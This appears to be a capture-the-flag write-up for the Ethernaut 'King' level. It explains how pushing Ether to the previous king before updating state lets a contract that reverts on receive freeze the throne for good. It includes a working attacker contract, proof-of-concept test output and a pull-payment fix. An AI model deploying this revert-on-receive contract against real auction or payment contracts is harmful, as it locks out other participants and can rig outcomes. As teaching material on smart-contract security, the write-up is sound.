# 09 - King

## 1. Challenge Overview

- **Objective**: Prevent anyone (including the owner or Ethernaut's level contract) from reclaiming kingship after you seize the throne.
- **Vulnerability Category**: Denial of Service (DoS) with (Unexpected) Revert / Push vs. Pull Payments (SWC-113).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

---

## 3. Vulnerability Analysis

### The Flaw: Push Payments & Unchecked External Calls

In `receive()`, when a challenger sends Ether to claim the throne:

```solidity
payable(king).transfer(msg.value); // PUSH PAYMENT!
king = msg.sender;
prize = msg.value;
```

1. **Coupled State Transition**: The contract attempts to **push** Ether to the existing `king` _before_ updating `king = msg.sender`.
2. **Untrusted External Code Execution**:
   - `payable(king).transfer(...)` triggers the fallback/receive function of `king`.
   - If `king` is a smart contract that explicitly calls `revert()` or has no payable fallback function, the transfer fails.
3. **Transaction Atomicity**:
   - When `transfer()` reverts, the EVM rolls back the entire transaction.
   - The code lines setting `king = msg.sender` are never reached.
   - The contract is permanently frozen in a **Denial of Service (DoS)** state where no one can ever overthrow the existing king.

---

## 4. Exploit Architecture

### 1. Attacker Contract (`src/attackers/KingAttack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract KingAttack {
    function attack(address payable target) external payable {
        // Send our ETH to King.receive() to claim the throne
        (bool success,) = target.call{value: msg.value}("");
        require(success, "Failed to claim kingship");
    }

    // The poison pill: Revert when anyone tries to pay us!
    receive() external payable {
        revert("I am King forever! Nobody can overthrow me!");
    }
}
```

### 2. Proof-of-Concept Test (`test/09-King.t.sol`)

We proved both behaviors locally:

1. `KingAttack` successfully claims kingship by sending the required prize.
2. When a challenger (or the original owner) tries to send a higher prize, the call **reverts**:

```text
Ran 2 tests for test/09-King.t.sol:KingTest
[PASS] test_InitialKingState() (gas: 14765)
[PASS] test_AttackAndPermanentDenialOfService() (gas: 88451)
Logs:
  Local PoC Success: Attacker contract is permanently King!
Suite result: ok. 2 passed; 0 failed
```

### 3. Execution Script (`script/09-King.s.sol`)

1. Reads `target.prize()` from the deployed instance.
2. Deploys `KingAttack`.
3. Calls `attackerContract.attack{value: currentPrize}(payable(instance))` to take the throne.
4. When you submit the instance on Ethernaut, the level contract's attempt to overthrow you reverts, and you pass the level!

---

## 5. Real-World Case Study: King of the Ether Throne (2016)

This level is based on the famous **King of the Ether Throne** DApp deployed on Ethereum in early 2016. Due to unhandled failed transfers and gas limitations, players using smart contract wallets accidentally bricked the throne, preventing any subsequent players from claiming the title.

Similarly, early NFT and decentralized auction contracts pushed refunds to previous bidders inside `bid()`. An attacker would place a bid through a contract that reverted on receive, guaranteeing they would win the auction since no higher bid could ever be processed!

---

## 6. Prevention & The "Pull over Push" Pattern

> [!TIP]
>
> ### The Pull Payment Pattern
>
> Never automatically push Ether to external untrusted addresses inside a critical state update. Instead, isolate the transfer into a separate withdrawal function.

### Secure Implementation

```solidity
mapping(address => uint256) public pendingWithdrawals;

receive() external payable {
    require(msg.value >= prize || msg.sender == owner);

    // Credit the previous king's balance internally (NO EXTERNAL CALL!)
    pendingWithdrawals[king] += msg.value;

    king = msg.sender;
    prize = msg.value;
}

// Let users pull their own funds:
function withdraw() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No funds to withdraw");

    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = payable(msg.sender).call{value: amount}("");
    require(success, "Withdrawal failed");
}
```

OpenZeppelin provides this out-of-the-box via the `PullPayment` utility.
